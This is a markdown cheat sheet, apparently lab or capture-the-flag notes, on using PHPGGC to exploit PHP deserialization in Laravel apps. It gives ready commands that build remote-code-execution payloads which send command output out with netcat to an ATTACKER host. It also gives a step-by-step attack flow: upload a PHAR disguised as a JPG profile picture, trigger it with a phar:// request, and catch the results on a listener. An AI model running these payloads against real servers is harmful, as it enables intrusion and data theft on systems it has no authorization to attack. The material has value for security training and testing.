# PHPGGC — PHP Generic Gadget Chains

## Overview

[PHPGGC](https://github.com/ambionics/phpggc) by Ambionics is a library of pre-built gadget chains for common PHP frameworks (Laravel, Symfony, Guzzle, Monolog, etc.). It generates serialized payloads without needing a command-injection magic method — the chain is built entirely from vendor code in the framework itself.

## Basic Usage

```bash
# List all chains for a framework
phpggc -l Laravel

# Generate base64 payload for direct unserialize() injection
phpggc Laravel/RCE9 system 'id | nc ATTACKER 9001' -b

# Generate PHAR file (for file_exists / fopen deserialization triggers)
phpggc -p phar Laravel/RCE9 system 'id | nc ATTACKER 9001' -o exploit.phar
```

## Chain Selection

Check the target's framework version against the chain's version range:

```
NAME             VERSION            TYPE                   VECTOR
Laravel/RCE9     5.4.0 <= 9.1.8+    RCE (Function call)    __destruct
Laravel/RCE10    5.6.0 <= 9.1.8+    RCE (Function call)    __toString
```

`Laravel 8.83.25` → `RCE9` or `RCE10` both apply.

## Attack Flow (PHAR variant)

1. Generate: `phpggc -p phar Laravel/RCE9 system '<cmd> | nc ATTACKER PORT' -o exploit.phar`
2. Upload `exploit.phar` as a profile picture (rename to `.jpg` if needed)
3. Note the stored path from the settings page image src
4. Start nc listener: `nc -nlvp PORT`
5. Trigger: `GET /image?_=phar://uploads/<hash>.jpg`

## Attack Flow (direct import variant)

```bash
phpggc Laravel/RCE9 system '<cmd> | nc ATTACKER PORT' -b
# POST the base64 to /settings-ie as the settings field
```

Note: PHPGGC payloads generate a 500 error on the app side (invalid object type) but RCE still fires before the error is returned.

## Key Notes

- PHP 8.4 deprecation warnings for dynamic properties are harmless — the PHAR is still generated correctly
- `curl` exits 28 (timeout) because `system()` blocks until the piped `nc` finishes — expected behavior, result is already received
- Always use `phpggc -p phar` for file-operation-triggered deserialization (PHAR attack), not plain `-b`
